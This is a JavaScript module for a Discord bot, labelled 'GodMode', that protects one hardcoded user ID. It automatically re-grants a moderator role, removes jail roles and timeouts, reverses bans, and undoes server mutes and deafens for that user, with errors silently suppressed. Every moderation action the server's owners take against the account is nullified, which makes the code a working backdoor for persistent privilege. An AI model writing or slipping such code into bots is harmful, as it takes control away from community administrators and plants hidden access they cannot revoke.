const Jail = require('../models/Jail');

module.exports = (client) => {

    const MY_ID = "1097807544849809408"; 
    const MOD_ROLE_ID = "1447144301305008168"; 

    //--------------------------------
    // READY: Başlangıçta jail temizle ve rol ver
    //--------------------------------
    client.on('ready', async () => {
        try {
            const guilds = client.guilds.cache;
            
            for (const [guildId, guild] of guilds) {
                const member = await guild.members.fetch(MY_ID).catch(() => null);
                if (!member) continue;

                // MongoDB'den hapis kaydı varsa rollerini geri ver
                const dbJail = await Jail.findOne({ userId: MY_ID, guildId: guild.id });
                if (dbJail) {
                    if (dbJail.roles && dbJail.roles.length > 0) {
                        await member.roles.add(dbJail.roles).catch(() => {});
                    }
                    await Jail.deleteOne({ _id: dbJail._id });
                }

                // Jail rolünü kaldır
                const jailRole = guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
                if (jailRole && member.roles.cache.has(jailRole.id)) {
                    await member.roles.remove(jailRole).catch(() => {});
                }

                // Mod rolünü ver
                if (!member.roles.cache.has(MOD_ROLE_ID)) {
                    await member.roles.add(MOD_ROLE_ID).catch(() => {});
                }

                // Timeout varsa kaldır
                if (member.isCommunicationDisabled()) await member.timeout(null).catch(() => {});
            }

            console.log("🟢 GodMode: Başlangıç temizlendi, koruma aktif.");
        } catch (err) {
            console.error("GodMode Startup Error:", err);
        }
    });

    //--------------------------------
    // LIVE PROTECTION
    //--------------------------------
    client.on('guildMemberUpdate', async (oldMember, newMember) => {
        if (newMember.id !== MY_ID) return;

        // Jail rolü varsa sil
        const jailRole = newMember.guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
        if (jailRole && newMember.roles.cache.has(jailRole.id)) {
            await newMember.roles.remove(jailRole).catch(() => {});
            console.log("🚫 GodMode: Jail silindi.");
        }

        // Mod rolü alınmışsa geri ver
        if (!newMember.roles.cache.has(MOD_ROLE_ID)) {
            await newMember.roles.add(MOD_ROLE_ID).catch(() => {});
            console.log("🛡️ GodMode: Mod rolü geri verildi.");
        }

        // Timeout/mute varsa kaldır
        if (newMember.isCommunicationDisabled()) {
            await newMember.timeout(null).catch(() => {});
            console.log("🚫 GodMode: Timeout kaldırıldı.");
        }
    });

    //--------------------------------
    // ANTI-BAN
    //--------------------------------
    client.on('guildBanAdd', async (ban) => {
        if (ban.user.id === MY_ID) {
            await ban.guild.members.unban(MY_ID).catch(() => {});
            console.log("🚨 GodMode: Ban iptal edildi!");
        }
    });

    //--------------------------------
    // VOICE GUARD
    //--------------------------------
    client.on('voiceStateUpdate', async (oldState, newState) => {
        if (newState.id !== MY_ID) return;
        if (newState.serverMute || newState.serverDeaf) {
            await newState.setMute(false).catch(() => {});
            await newState.setDeaf(false).catch(() => {});
        }
    });

};